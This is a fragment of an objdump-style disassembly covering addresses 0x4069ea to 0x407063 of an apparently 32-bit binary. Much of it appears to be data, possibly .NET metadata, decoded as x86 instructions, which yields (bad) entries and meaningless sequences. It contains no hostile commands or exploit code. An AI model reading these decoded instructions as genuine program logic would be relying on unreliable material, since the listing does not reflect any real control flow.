  4069ea:	86 18                	xchg   %bl,(%eax)
  4069ec:	03 15 0e 00 5c 00    	add    0x5c000e,%edx
  4069f2:	28 55 00             	sub    %dl,0x0(%ebp)
  4069f5:	00 00                	add    %al,(%eax)
  4069f7:	00 96 00 3b 0c b1    	add    %dl,-0x4ef3c500(%esi)
  4069fd:	02 5c 00 8f          	add    -0x71(%eax,%eax,1),%bl
  406a01:	25 00 00 00 00       	and    $0x0,%eax
  406a06:	96                   	xchg   %eax,%esi
  406a07:	00 3b                	add    %bh,(%ebx)
  406a09:	0c b8                	or     $0xb8,%al
  406a0b:	02 5e 00             	add    0x0(%esi),%bl
  406a0e:	4c                   	dec    %esp
  406a0f:	55                   	push   %ebp
  406a10:	00 00                	add    %al,(%eax)
  406a12:	00 00                	add    %al,(%eax)
  406a14:	96                   	xchg   %eax,%esi
  406a15:	00 3b                	add    %bh,(%ebx)
  406a17:	0c be                	or     $0xbe,%al
  406a19:	02 5f 00             	add    0x0(%edi),%bl
  406a1c:	78 20                	js     0x406a3e
  406a1e:	00 00                	add    %al,(%eax)
  406a20:	00 00                	add    %al,(%eax)
  406a22:	86 18                	xchg   %bl,(%eax)
  406a24:	03 15 0e 00 61 00    	add    0x61000e,%edx
  406a2a:	9e                   	sahf
  406a2b:	25 00 00 00 00       	and    $0x0,%eax
  406a30:	96                   	xchg   %eax,%esi
  406a31:	00 3c 0f             	add    %bh,(%edi,%ecx,1)
  406a34:	c5 02                	lds    (%edx),%eax
  406a36:	61                   	popa
  406a37:	00 0c 56             	add    %cl,(%esi,%edx,2)
  406a3a:	00 00                	add    %al,(%eax)
  406a3c:	00 00                	add    %al,(%eax)
  406a3e:	96                   	xchg   %eax,%esi
  406a3f:	00 55 0c             	add    %dl,0xc(%ebp)
  406a42:	cb                   	lret
  406a43:	02 62 00             	add    0x0(%edx),%ah
  406a46:	d4 56                	aam    $0x56
  406a48:	00 00                	add    %al,(%eax)
  406a4a:	00 00                	add    %al,(%eax)
  406a4c:	96                   	xchg   %eax,%esi
  406a4d:	00 38                	add    %bh,(%eax)
  406a4f:	1d d2 02 64 00       	sbb    $0x6402d2,%eax
  406a54:	ab                   	stos   %eax,%es:(%edi)
  406a55:	25 00 00 00 00       	and    $0x0,%eax
  406a5a:	96                   	xchg   %eax,%esi
  406a5b:	00 d9                	add    %bl,%cl
  406a5d:	18 da                	sbb    %bl,%dl
  406a5f:	02 66 00             	add    0x0(%esi),%ah
  406a62:	c6                   	(bad)
  406a63:	25 00 00 00 00       	and    $0x0,%eax
  406a68:	96                   	xchg   %eax,%esi
  406a69:	00 25 06 e1 02 68    	add    %ah,0x6802e106
  406a6f:	00 e6                	add    %ah,%dh
  406a71:	25 00 00 00 00       	and    $0x0,%eax
  406a76:	96                   	xchg   %eax,%esi
  406a77:	00 5f 10             	add    %bl,0x10(%edi)
  406a7a:	e8 02 6a 00 74       	call   0x7440d481
  406a7f:	57                   	push   %edi
  406a80:	00 00                	add    %al,(%eax)
  406a82:	00 00                	add    %al,(%eax)
  406a84:	96                   	xchg   %eax,%esi
  406a85:	00 a1 00 ef 02 6c    	add    %ah,0x6c02ef00(%ecx)
  406a8b:	00 a4 57 00 00 00 00 	add    %ah,0x0(%edi,%edx,2)
  406a92:	96                   	xchg   %eax,%esi
  406a93:	00 a6 13 f6 02 6e    	add    %ah,0x6e02f613(%esi)
  406a99:	00 78 20             	add    %bh,0x20(%eax)
  406a9c:	00 00                	add    %al,(%eax)
  406a9e:	00 00                	add    %al,(%eax)
  406aa0:	86 18                	xchg   %bl,(%eax)
  406aa2:	03 15 0e 00 70 00    	add    0x70000e,%edx
  406aa8:	e8 58 00 00 00       	call   0x406b05
  406aad:	00 96 00 69 18 84    	add    %dl,-0x7be79700(%esi)
  406ab3:	01 70 00             	add    %esi,0x0(%eax)
  406ab6:	74 59                	je     0x406b11
  406ab8:	00 00                	add    %al,(%eax)
  406aba:	00 00                	add    %al,(%eax)
  406abc:	96                   	xchg   %eax,%esi
  406abd:	00 60 18             	add    %ah,0x18(%eax)
  406ac0:	84 01                	test   %al,(%ecx)
  406ac2:	71 00                	jno    0x406ac4
  406ac4:	00 00                	add    %al,(%eax)
  406ac6:	01 00                	add    %eax,(%eax)
  406ac8:	c1 0a 00             	rorl   $0x0,(%edx)
  406acb:	00 01                	add    %al,(%ecx)
  406acd:	00 c1                	add    %al,%cl
  406acf:	0a 00                	or     (%eax),%al
  406ad1:	00 01                	add    %al,(%ecx)
  406ad3:	00 c1                	add    %al,%cl
  406ad5:	0a 00                	or     (%eax),%al
  406ad7:	00 01                	add    %al,(%ecx)
  406ad9:	00 c1                	add    %al,%cl
  406adb:	0a 00                	or     (%eax),%al
  406add:	00 01                	add    %al,(%ecx)
  406adf:	00 c1                	add    %al,%cl
  406ae1:	0a 00                	or     (%eax),%al
  406ae3:	00 01                	add    %al,(%ecx)
  406ae5:	00 c1                	add    %al,%cl
  406ae7:	0a 00                	or     (%eax),%al
  406ae9:	00 01                	add    %al,(%ecx)
  406aeb:	00 c1                	add    %al,%cl
  406aed:	0a 00                	or     (%eax),%al
  406aef:	00 01                	add    %al,(%ecx)
  406af1:	00 c1                	add    %al,%cl
  406af3:	0a 00                	or     (%eax),%al
  406af5:	00 01                	add    %al,(%ecx)
  406af7:	00 c1                	add    %al,%cl
  406af9:	0a 00                	or     (%eax),%al
  406afb:	00 01                	add    %al,(%ecx)
  406afd:	00 c1                	add    %al,%cl
  406aff:	0a 00                	or     (%eax),%al
  406b01:	00 01                	add    %al,(%ecx)
  406b03:	00 a2 07 00 00 01    	add    %ah,0x1000007(%edx)
  406b09:	00 50 13             	add    %dl,0x13(%eax)
  406b0c:	00 00                	add    %al,(%eax)
  406b0e:	02 00                	add    (%eax),%al
  406b10:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406b11:	08 00                	or     %al,(%eax)
  406b13:	00 03                	add    %al,(%ebx)
  406b15:	00 a7 10 00 00 04    	add    %ah,0x4000010(%edi)
  406b1b:	00 20                	add    %ah,(%eax)
  406b1d:	18 00                	sbb    %al,(%eax)
  406b1f:	00 01                	add    %al,(%ecx)
  406b21:	00 d0                	add    %dl,%al
  406b23:	12 00                	adc    (%eax),%al
  406b25:	00 01                	add    %al,(%ecx)
  406b27:	00 10                	add    %dl,(%eax)
  406b29:	0d 00 00 01 00       	or     $0x10000,%eax
  406b2e:	b6 0d                	mov    $0xd,%dh
  406b30:	00 00                	add    %al,(%eax)
  406b32:	01 00                	add    %eax,(%eax)
  406b34:	b6 0d                	mov    $0xd,%dh
  406b36:	00 00                	add    %al,(%eax)
  406b38:	01 00                	add    %eax,(%eax)
  406b3a:	20 0d 00 00 01 00    	and    %cl,0x10000
  406b40:	d2 18                	rcrb   %cl,(%eax)
  406b42:	00 00                	add    %al,(%eax)
  406b44:	01 00                	add    %eax,(%eax)
  406b46:	bf 04 00 00 02       	mov    $0x2000004,%edi
  406b4b:	00 fb                	add    %bh,%bl
  406b4d:	1b 00                	sbb    (%eax),%eax
  406b4f:	00 03                	add    %al,(%ebx)
  406b51:	00 60 1b             	add    %ah,0x1b(%eax)
  406b54:	00 00                	add    %al,(%eax)
  406b56:	01 00                	add    %eax,(%eax)
  406b58:	2a 07                	sub    (%edi),%al
  406b5a:	00 00                	add    %al,(%eax)
  406b5c:	01 00                	add    %eax,(%eax)
  406b5e:	3b 18                	cmp    (%eax),%ebx
  406b60:	00 00                	add    %al,(%eax)
  406b62:	02 00                	add    (%eax),%al
  406b64:	1e                   	push   %ds
  406b65:	1b 00                	sbb    (%eax),%eax
  406b67:	00 01                	add    %al,(%ecx)
  406b69:	00 f9                	add    %bh,%cl
  406b6b:	16                   	push   %ss
  406b6c:	00 00                	add    %al,(%eax)
  406b6e:	01 00                	add    %eax,(%eax)
  406b70:	35 00 00 00 02       	xor    $0x2000000,%eax
  406b75:	00 9b 00 00 00 03    	add    %bl,0x3000000(%ebx)
  406b7b:	00 9e 00 00 00 01    	add    %bl,0x1000000(%esi)
  406b81:	00 50 13             	add    %dl,0x13(%eax)
  406b84:	00 00                	add    %al,(%eax)
  406b86:	02 00                	add    (%eax),%al
  406b88:	62 0b                	bound  %ecx,(%ebx)
  406b8a:	00 00                	add    %al,(%eax)
  406b8c:	01 00                	add    %eax,(%eax)
  406b8e:	a2 07 00 00 02       	mov    %al,0x2000007
  406b93:	00 c1                	add    %al,%cl
  406b95:	0a 00                	or     (%eax),%al
  406b97:	00 01                	add    %al,(%ecx)
  406b99:	00 c1                	add    %al,%cl
  406b9b:	0a 00                	or     (%eax),%al
  406b9d:	00 01                	add    %al,(%ecx)
  406b9f:	00 a2 07 00 00 01    	add    %ah,0x1000007(%edx)
  406ba5:	00 b3 02 00 00 01    	add    %dh,0x1000002(%ebx)
  406bab:	00 1d 0e 00 00 01    	add    %bl,0x100000e
  406bb1:	00 43 1c             	add    %al,0x1c(%ebx)
  406bb4:	00 00                	add    %al,(%eax)
  406bb6:	01 00                	add    %eax,(%eax)
  406bb8:	df 1c 00             	fistps (%eax,%eax,1)
  406bbb:	00 01                	add    %al,(%ecx)
  406bbd:	00 b3 1b 00 00 01    	add    %dh,0x100001b(%ebx)
  406bc3:	00 b3 1b 00 00 01    	add    %dh,0x100001b(%ebx)
  406bc9:	00 b3 1b 00 00 01    	add    %dh,0x100001b(%ebx)
  406bcf:	00 b3 1b 00 00 01    	add    %dh,0x100001b(%ebx)
  406bd5:	00 32                	add    %dh,(%edx)
  406bd7:	00 00                	add    %al,(%eax)
  406bd9:	00 02                	add    %al,(%edx)
  406bdb:	00 87 00 00 00 01    	add    %al,0x1000000(%edi)
  406be1:	00 b3 1b 00 00 01    	add    %dh,0x100001b(%ebx)
  406be7:	00 b3 1b 00 00 01    	add    %dh,0x100001b(%ebx)
  406bed:	00 bd 18 00 00 01    	add    %bh,0x1000018(%ebp)
  406bf3:	00 4d 16             	add    %cl,0x16(%ebp)
  406bf6:	00 00                	add    %al,(%eax)
  406bf8:	01 00                	add    %eax,(%eax)
  406bfa:	c9                   	leave
  406bfb:	16                   	push   %ss
  406bfc:	00 00                	add    %al,(%eax)
  406bfe:	01 00                	add    %eax,(%eax)
  406c00:	c9                   	leave
  406c01:	16                   	push   %ss
  406c02:	00 00                	add    %al,(%eax)
  406c04:	01 00                	add    %eax,(%eax)
  406c06:	00 1c 00             	add    %bl,(%eax,%eax,1)
  406c09:	00 01                	add    %al,(%ecx)
  406c0b:	00 00                	add    %al,(%eax)
  406c0d:	1c 00                	sbb    $0x0,%al
  406c0f:	00 01                	add    %al,(%ecx)
  406c11:	00 00                	add    %al,(%eax)
  406c13:	1c 00                	sbb    $0x0,%al
  406c15:	00 01                	add    %al,(%ecx)
  406c17:	00 00                	add    %al,(%eax)
  406c19:	1c 00                	sbb    $0x0,%al
  406c1b:	00 01                	add    %al,(%ecx)
  406c1d:	00 00                	add    %al,(%eax)
  406c1f:	1c 00                	sbb    $0x0,%al
  406c21:	00 01                	add    %al,(%ecx)
  406c23:	00 b6 0d 00 00 01    	add    %dh,0x100000d(%esi)
  406c29:	00 a3 0d 00 00 02    	add    %ah,0x200000d(%ebx)
  406c2f:	00 ae 0d 00 00 01    	add    %ch,0x100000d(%esi)
  406c35:	00 c1                	add    %al,%cl
  406c37:	0a 00                	or     (%eax),%al
  406c39:	00 01                	add    %al,(%ecx)
  406c3b:	00 c1                	add    %al,%cl
  406c3d:	0a 00                	or     (%eax),%al
  406c3f:	00 01                	add    %al,(%ecx)
  406c41:	00 c1                	add    %al,%cl
  406c43:	0a 00                	or     (%eax),%al
  406c45:	00 01                	add    %al,(%ecx)
  406c47:	00 29                	add    %ch,(%ecx)
  406c49:	1c 00                	sbb    $0x0,%al
  406c4b:	00 01                	add    %al,(%ecx)
  406c4d:	00 c1                	add    %al,%cl
  406c4f:	0a 00                	or     (%eax),%al
  406c51:	00 01                	add    %al,(%ecx)
  406c53:	00 a2 07 00 00 01    	add    %ah,0x1000007(%edx)
  406c59:	00 a2 07 00 00 01    	add    %ah,0x1000007(%edx)
  406c5f:	00 ba 17 00 00 01    	add    %bh,0x1000017(%edx)
  406c65:	00 ba 17 00 00 01    	add    %bh,0x1000017(%edx)
  406c6b:	00 c1                	add    %al,%cl
  406c6d:	0a 00                	or     (%eax),%al
  406c6f:	00 01                	add    %al,(%ecx)
  406c71:	00 c1                	add    %al,%cl
  406c73:	0a 00                	or     (%eax),%al
  406c75:	00 01                	add    %al,(%ecx)
  406c77:	00 c1                	add    %al,%cl
  406c79:	0a 00                	or     (%eax),%al
  406c7b:	00 01                	add    %al,(%ecx)
  406c7d:	00 f6                	add    %dh,%dh
  406c7f:	1c 00                	sbb    $0x0,%al
  406c81:	00 02                	add    %al,(%edx)
  406c83:	00 c1                	add    %al,%cl
  406c85:	0a 00                	or     (%eax),%al
  406c87:	00 01                	add    %al,(%ecx)
  406c89:	00 f6                	add    %dh,%dh
  406c8b:	1c 00                	sbb    $0x0,%al
  406c8d:	00 02                	add    %al,(%edx)
  406c8f:	00 c1                	add    %al,%cl
  406c91:	0a 00                	or     (%eax),%al
  406c93:	00 01                	add    %al,(%ecx)
  406c95:	00 21                	add    %ah,(%ecx)
  406c97:	07                   	pop    %es
  406c98:	00 00                	add    %al,(%eax)
  406c9a:	01 00                	add    %eax,(%eax)
  406c9c:	21 07                	and    %eax,(%edi)
  406c9e:	00 00                	add    %al,(%eax)
  406ca0:	01 00                	add    %eax,(%eax)
  406ca2:	62 0d 00 00 01 00    	bound  %ecx,0x10000
  406ca8:	c1 0a 00             	rorl   $0x0,(%edx)
  406cab:	00 01                	add    %al,(%ecx)
  406cad:	00 63 0e             	add    %ah,0xe(%ebx)
  406cb0:	00 00                	add    %al,(%eax)
  406cb2:	01 00                	add    %eax,(%eax)
  406cb4:	68 0e 00 00 01       	push   $0x100000e
  406cb9:	00 68 0e             	add    %ch,0xe(%eax)
  406cbc:	00 00                	add    %al,(%eax)
  406cbe:	01 00                	add    %eax,(%eax)
  406cc0:	c9                   	leave
  406cc1:	16                   	push   %ss
  406cc2:	00 00                	add    %al,(%eax)
  406cc4:	01 00                	add    %eax,(%eax)
  406cc6:	21 07                	and    %eax,(%edi)
  406cc8:	00 00                	add    %al,(%eax)
  406cca:	01 00                	add    %eax,(%eax)
  406ccc:	ba 17 00 00 01       	mov    $0x1000017,%edx
  406cd1:	00 ba 17 00 00 01    	add    %bh,0x1000017(%edx)
  406cd7:	00 c1                	add    %al,%cl
  406cd9:	0a 00                	or     (%eax),%al
  406cdb:	00 01                	add    %al,(%ecx)
  406cdd:	00 c1                	add    %al,%cl
  406cdf:	0a 00                	or     (%eax),%al
  406ce1:	00 01                	add    %al,(%ecx)
  406ce3:	00 c1                	add    %al,%cl
  406ce5:	0a 00                	or     (%eax),%al
  406ce7:	00 01                	add    %al,(%ecx)
  406ce9:	00 ba 17 00 00 02    	add    %bh,0x2000017(%edx)
  406cef:	00 8b 10 00 00 01    	add    %cl,0x1000010(%ebx)
  406cf5:	00 ba 17 00 00 01    	add    %bh,0x1000017(%edx)
  406cfb:	00 6c 0b 00          	add    %ch,0x0(%ebx,%ecx,1)
  406cff:	00 02                	add    %al,(%edx)
  406d01:	00 ba 17 00 00 01    	add    %bh,0x1000017(%edx)
  406d07:	00 ba 17 00 00 01    	add    %bh,0x1000017(%edx)
  406d0d:	00 ba 17 00 00 02    	add    %bh,0x2000017(%edx)
  406d13:	00 72 0e             	add    %dh,0xe(%edx)
  406d16:	00 00                	add    %al,(%eax)
  406d18:	01 00                	add    %eax,(%eax)
  406d1a:	ba 17 00 00 02       	mov    $0x2000017,%edx
  406d1f:	00 c0                	add    %al,%al
  406d21:	16                   	push   %ss
  406d22:	00 00                	add    %al,(%eax)
  406d24:	01 00                	add    %eax,(%eax)
  406d26:	ba 17 00 00 02       	mov    $0x2000017,%edx
  406d2b:	00 68 0e             	add    %ch,0xe(%eax)
  406d2e:	00 00                	add    %al,(%eax)
  406d30:	01 00                	add    %eax,(%eax)
  406d32:	ba 17 00 00 02       	mov    $0x2000017,%edx
  406d37:	00 68 0e             	add    %ch,0xe(%eax)
  406d3a:	00 00                	add    %al,(%eax)
  406d3c:	01 00                	add    %eax,(%eax)
  406d3e:	ba 17 00 00 02       	mov    $0x2000017,%edx
  406d43:	00 63 0e             	add    %ah,0xe(%ebx)
  406d46:	00 00                	add    %al,(%eax)
  406d48:	01 00                	add    %eax,(%eax)
  406d4a:	ba 17 00 00 02       	mov    $0x2000017,%edx
  406d4f:	00 6d 0e             	add    %ch,0xe(%ebp)
  406d52:	00 00                	add    %al,(%eax)
  406d54:	01 00                	add    %eax,(%eax)
  406d56:	ba 17 00 00 02       	mov    $0x2000017,%edx
  406d5b:	00 6d 0e             	add    %ch,0xe(%ebp)
  406d5e:	00 00                	add    %al,(%eax)
  406d60:	01 00                	add    %eax,(%eax)
  406d62:	b3 1b                	mov    $0x1b,%bl
  406d64:	00 00                	add    %al,(%eax)
  406d66:	01 00                	add    %eax,(%eax)
  406d68:	b3 1b                	mov    $0x1b,%bl
  406d6a:	16                   	push   %ss
  406d6b:	00 59 00             	add    %bl,0x0(%ecx)
  406d6e:	18 00                	sbb    %al,(%eax)
  406d70:	5d                   	pop    %ebp
  406d71:	00 b1 00 ec 1a bb    	add    %dh,-0x44e51400(%ecx)
  406d77:	01 b1 00 d8 1b bf    	add    %esi,-0x40e42800(%ecx)
  406d7d:	01 b1 00 c7 19 0e    	add    %esi,0xe19c700(%ecx)
  406d83:	00 b9 00 eb 14 64    	add    %bh,0x6414eb00(%ecx)
  406d89:	02 c9                	add    %cl,%cl
  406d8b:	00 03                	add    %al,(%ebx)
  406d8d:	15 01 03 d1 00       	adc    $0xd10301,%eax
  406d92:	03 15 0e 00 d9 00    	add    0xd9000e,%edx
  406d98:	03 15 2e 03 e9 00    	add    0xe9032e,%edx
  406d9e:	03 15 6b 01 f1 00    	add    0xf1016b,%edx
  406da4:	03 15 6b 01 f9 00    	add    0xf9016b,%edx
  406daa:	03 15 6b 01 01 01    	add    0x101016b,%edx
  406db0:	03 15 6b 01 09 01    	add    0x109016b,%edx
  406db6:	03 15 6b 01 11 01    	add    0x111016b,%edx
  406dbc:	03 15 6b 01 19 01    	add    0x119016b,%edx
  406dc2:	03 15 6b 01 21 01    	add    0x121016b,%edx
  406dc8:	03 15 6b 01 29 01    	add    0x129016b,%edx
  406dce:	03 15 6b 01 31 01    	add    0x131016b,%edx
  406dd4:	03 15 4b 02 39 01    	add    0x139024b,%edx
  406dda:	03 15 0e 00 41 01    	add    0x141000e,%edx
  406de0:	03 15 6b 01 49 01    	add    0x149016b,%edx
  406de6:	7b 12                	jnp    0x406dfa
  406de8:	7f 00                	jg     0x406dea
  406dea:	51                   	push   %ecx
  406deb:	01 6e 00             	add    %ebp,0x0(%esi)
  406dee:	c4 03                	les    (%ebx),%eax
  406df0:	59                   	pop    %ecx
  406df1:	01 f1                	add    %esi,%ecx
  406df3:	19 7f 00             	sbb    %edi,0x0(%edi)
  406df6:	51                   	push   %ecx
  406df7:	01 6c 10 84          	add    %ebp,-0x7c(%eax,%edx,1)
  406dfb:	00 09                	add    %cl,(%ecx)
  406dfd:	00 03                	add    %al,(%ebx)
  406dff:	15 0e 00 61 01       	adc    $0x161000e,%eax
  406e04:	37                   	aaa
  406e05:	01 cd                	add    %ecx,%ebp
  406e07:	03 51 01             	add    0x1(%ecx),%edx
  406e0a:	1b 0c 2a             	sbb    (%edx,%ebp,1),%ecx
  406e0d:	01 61 01             	add    %esp,0x1(%ecx)
  406e10:	aa                   	stos   %al,%es:(%edi)
  406e11:	0c d3                	or     $0xd3,%al
  406e13:	03 11                	add    (%ecx),%edx
  406e15:	00 03                	add    %al,(%ebx)
  406e17:	15 2b 02 11 00       	adc    $0x11022b,%eax
  406e1c:	c8 1c d9 03          	enter  $0xd91c,$0x3
  406e20:	69 01 93 1c df 03    	imul   $0x3df1c93,(%ecx),%eax
  406e26:	61                   	popa
  406e27:	01 b7 16 e5 03 81    	add    %esi,-0x7efc1aea(%edi)
  406e2d:	01 e2                	add    %esp,%edx
  406e2f:	01 c7                	add    %eax,%edi
  406e31:	00 79 01             	add    %bh,0x1(%ecx)
  406e34:	32 0d eb 03 19 00    	xor    0x1903eb,%cl
  406e3a:	03 15 09 04 19 00    	add    0x190409,%edx
  406e40:	42                   	inc    %edx
  406e41:	0b 01                	or     (%ecx),%eax
  406e43:	03 19                	add    (%ecx),%ebx
  406e45:	00 2f                	add    %ch,(%edi)
  406e47:	0b 01                	or     (%ecx),%eax
  406e49:	03 c1                	add    %ecx,%eax
  406e4b:	01 6d 1d             	add    %ebp,0x1d(%ebp)
  406e4e:	16                   	push   %ss
  406e4f:	04 c1                	add    $0xc1,%al
  406e51:	01 e3                	add    %esp,%ebx
  406e53:	19 1c 04             	sbb    %ebx,(%esp,%eax,1)
  406e56:	d1 01                	roll   $1,(%ecx)
  406e58:	03 15 0e 00 d1 01    	add    0x1d1000e,%edx
  406e5e:	dc 1b                	fcompl (%ebx)
  406e60:	23 04 d9             	and    (%ecx,%ebx,8),%eax
  406e63:	01 f4                	add    %esi,%esp
  406e65:	15 28 04 19 00       	adc    $0x190428,%eax
  406e6a:	4a                   	dec    %edx
  406e6b:	19 30                	sbb    %esi,(%eax)
  406e6d:	04 19                	add    $0x19,%al
  406e6f:	00 34 03             	add    %dh,(%ebx,%eax,1)
  406e72:	bf 01 19 00 4a       	mov    $0x4a001901,%edi
  406e77:	19 3c 02             	sbb    %edi,(%edx,%eax,1)
  406e7a:	99                   	cltd
  406e7b:	01 03                	add    %eax,(%ebx)
  406e7d:	15 0e 00 a1 01       	adc    $0x1a1000e,%eax
  406e82:	03 15 36 02 99 01    	add    0x1990236,%edx
  406e88:	64 17                	fs pop %ss
  406e8a:	38 04 99             	cmp    %al,(%ecx,%ebx,4)
  406e8d:	01 46 0c             	add    %eax,0xc(%esi)
  406e90:	70 01                	jo     0x406e93
  406e92:	c1 01 e3             	roll   $0xe3,(%ecx)
  406e95:	19 3f                	sbb    %edi,(%edi)
  406e97:	04 d1                	add    $0xd1,%al
  406e99:	01 dc                	add    %ebx,%esp
  406e9b:	1b 49 04             	sbb    0x4(%ecx),%ecx
  406e9e:	f1                   	int1
  406e9f:	01 64 08 0e          	add    %esp,0xe(%eax,%ecx,1)
  406ea3:	00 f9                	add    %bh,%cl
  406ea5:	01 03                	add    %eax,(%ebx)
  406ea7:	15 4f 04 01 02       	adc    $0x201044f,%eax
  406eac:	03 15 56 04 21 00    	add    0x210456,%edx
  406eb2:	03 15 5c 04 19 00    	add    0x19045c,%edx
  406eb8:	30 1b                	xor    %bl,(%ebx)
  406eba:	66 04 09             	data16 add $0x9,%al
  406ebd:	00 61 0c             	add    %ah,0xc(%ecx)
  406ec0:	47                   	inc    %edi
  406ec1:	02 21                	add    (%ecx),%ah
  406ec3:	00 6c 1a 6c          	add    %ch,0x6c(%edx,%ebx,1)
  406ec7:	04 29                	add    $0x29,%al
  406ec9:	02 03                	add    (%ebx),%al
  406ecb:	15 56 04 29 00       	adc    $0x290456,%eax
  406ed0:	03 15 78 04 31 02    	add    0x2310478,%edx
  406ed6:	03 15 56 04 c1 00    	add    0xc10456,%edx
  406edc:	07                   	pop    %es
  406edd:	03 82 04 39 02 94    	add    -0x6bfdc6fc(%edx),%eax
  406ee3:	07                   	pop    %es
  406ee4:	8f 04 31             	pop    (%ecx,%esi,1)
  406ee7:	00 74 17 96          	add    %dh,-0x6a(%edi,%edx,1)
  406eeb:	04 c1                	add    $0xc1,%al
  406eed:	00 64 08 0e          	add    %ah,0xe(%eax,%ecx,1)
  406ef1:	00 19                	add    %bl,(%ecx)
  406ef3:	00 64 08 0e          	add    %ah,0xe(%eax,%ecx,1)
  406ef7:	00 29                	add    %ch,(%ecx)
  406ef9:	00 64 08 0e          	add    %ah,0xe(%eax,%ecx,1)
  406efd:	00 c1                	add    %al,%cl
  406eff:	00 ff                	add    %bh,%bh
  406f01:	02 a1 04 49 02 6e    	add    0x6e024904(%ecx),%ah
  406f07:	00 a7 04 c1 00 0c    	add    %ah,0xc00c104(%edi)
  406f0d:	03 ae 04 51 02 03    	add    0x3025104(%esi),%ebp
  406f13:	15 56 04 49 01       	adc    $0x1490456,%eax
  406f18:	03 15 b6 04 49 01    	add    0x14904b6,%edx
  406f1e:	95                   	xchg   %eax,%ebp
  406f1f:	1b bd 04 61 02 84    	sbb    -0x7bfd9efc(%ebp),%edi
  406f25:	14 cf                	adc    $0xcf,%al
  406f27:	04 49                	add    $0x49,%al
  406f29:	02 b7 16 9f 01 19    	add    0x19019f16(%edi),%dh
  406f2f:	00 37                	add    %dh,(%edi)
  406f31:	0f d6                	(bad)
  406f33:	04 c1                	add    $0xc1,%al
  406f35:	00 e2                	add    %ah,%dl
  406f37:	08 de                	or     %bl,%dh
  406f39:	04 59                	add    $0x59,%al
  406f3b:	02 03                	add    (%ebx),%al
  406f3d:	15 2b 02 c1 00       	adc    $0xc1022b,%eax
  406f42:	a3 11 15 02 c1       	mov    %eax,0xc1021511
  406f47:	00 3d 0d 0e 00 61    	add    %bh,0x61000e0d
  406f4d:	02 f1                	add    %cl,%dh
  406f4f:	19 9a 00 71 02 42    	sbb    %ebx,0x42027100(%edx)
  406f55:	19 0a                	sbb    %ecx,(%edx)
  406f57:	00 59 01             	add    %bl,0x1(%ecx)
  406f5a:	cc                   	int3
  406f5b:	15 c7 00 a1 02       	adc    $0x2a100c7,%eax
  406f60:	dc 07                	faddl  (%edi)
  406f62:	01 05 79 02 03 15    	add    %eax,0x15030279
  406f68:	6b 01 81             	imul   $0xffffff81,(%ecx),%eax
  406f6b:	02 44 18 07          	add    0x7(%eax,%ebx,1),%al
  406f6f:	05 81 02 a2 06       	add    $0x6a20281,%eax
  406f74:	0d 05 a9 02 eb       	or     $0xeb02a905,%eax
  406f79:	06                   	push   %es
  406f7a:	47                   	inc    %edi
  406f7b:	02 b1 02 56 07 47    	add    0x47075602(%ecx),%dh
  406f81:	02 c1                	add    %cl,%al
  406f83:	01 79 1d             	add    %edi,0x1d(%ecx)
  406f86:	16                   	push   %ss
  406f87:	04 81                	add    $0x81,%al
  406f89:	02 e7                	add    %bh,%ah
  406f8b:	15 13 05 81 02       	adc    $0x2810513,%eax
  406f90:	32 0f                	xor    (%edi),%cl
  406f92:	0e                   	push   %cs
  406f93:	00 89 02 03 15 0e    	add    %cl,0xe150302(%ecx)
  406f99:	00 89 02 f8 06 6b    	add    %cl,0x6b06f802(%ecx)
  406f9f:	01 b1 02 e2 06 47    	add    %esi,0x4706e202(%ecx)
  406fa5:	02 a1 02 df 10 c7    	add    -0x38ef20fe(%ecx),%ah
  406fab:	00 c1                	add    %al,%cl
  406fad:	01 bf 18 1a 05 89    	add    %edi,-0x76fae5e8(%edi)
  406fb3:	02 87 18 6b 01 89    	add    -0x76fe94e8(%edi),%al
  406fb9:	02 bf 06 20 05 89    	add    -0x76fadffa(%edi),%bh
  406fbf:	02 16                	add    (%esi),%dl
  406fc1:	1c 4b                	sbb    $0x4b,%al
  406fc3:	02 81 02 95 1b 27    	add    0x271b9502(%ecx),%al
  406fc9:	05 c1 02 60 14       	add    $0x146002c1,%eax
  406fce:	30 05 c9 02 72 08    	xor    %al,0x87202c9
  406fd4:	c7 00 91 02 bd 1c    	movl   $0x1cbd0291,(%eax)
  406fda:	35 05 c1 01 bf       	xor    $0xbf01c105,%eax
  406fdf:	18 3f                	sbb    %bh,(%edi)
  406fe1:	05 91 02 b8 0a       	add    $0xab80291,%eax
  406fe6:	46                   	inc    %esi
  406fe7:	05 d9 02 a8 18       	add    $0x18a802d9,%eax
  406fec:	84 00                	test   %al,(%eax)
  406fee:	d9 02                	flds   (%edx)
  406ff0:	d2 08                	rorb   %cl,(%eax)
  406ff2:	3e 01 e1             	ds add %esp,%ecx
  406ff5:	02 03                	add    (%ebx),%al
  406ff7:	15 4c 05 d9 02       	adc    $0x2d9054c,%eax
  406ffc:	6a 16                	push   $0x16
  406ffe:	2a 01                	sub    (%ecx),%al
  407000:	a1 02 05 07 c3       	mov    0xc3070502,%eax
  407005:	00 c1                	add    %al,%cl
  407007:	01 bf 18 01 05 99    	add    %edi,-0x66fafee8(%edi)
  40700d:	02 03                	add    (%ebx),%al
  40700f:	15 6b 01 f1 02       	adc    $0x2f1016b,%eax
  407014:	d2 07                	rolb   %cl,(%edi)
  407016:	6b 01 a1             	imul   $0xffffffa1,(%ecx),%eax
  407019:	02 56 0d             	add    0xd(%esi),%dl
  40701c:	c3                   	ret
  40701d:	00 a1 02 15 07 c7    	add    %ah,-0x38f8eafe(%ecx)
  407023:	00 89 02 00 0d 4b    	add    %cl,0x4b0d0002(%ecx)
  407029:	02 89 02 71 0a 4b    	add    0x4b0a7102(%ecx),%cl
  40702f:	02 59 01             	add    0x1(%ecx),%bl
  407032:	a3 1b 3e 01 59       	mov    %eax,0x59013e1b
  407037:	01 4d 1d             	add    %ecx,0x1d(%ebp)
  40703a:	c3                   	ret
  40703b:	00 a1 02 66 1b c7    	add    %ah,-0x38e499fe(%ecx)
  407041:	00 f9                	add    %bh,%cl
  407043:	02 03                	add    (%ebx),%al
  407045:	15 6b 01 f9 02       	adc    $0x2f9016b,%eax
  40704a:	03 0b                	add    (%ebx),%ecx
  40704c:	23 02                	and    (%edx),%eax
  40704e:	01 03                	add    %eax,(%ebx)
  407050:	03 15 0e 00 01 03    	add    0x301000e,%edx
  407056:	47                   	inc    %edi
  407057:	07                   	pop    %es
  407058:	47                   	inc    %edi
  407059:	02 c1                	add    %cl,%al
  40705b:	01 97 14 47 02 c1    	add    %edx,-0x3efdb8ec(%edi)
  407061:	01 c1                	add    %eax,%ecx
  407063:	17                   	pop    %ss
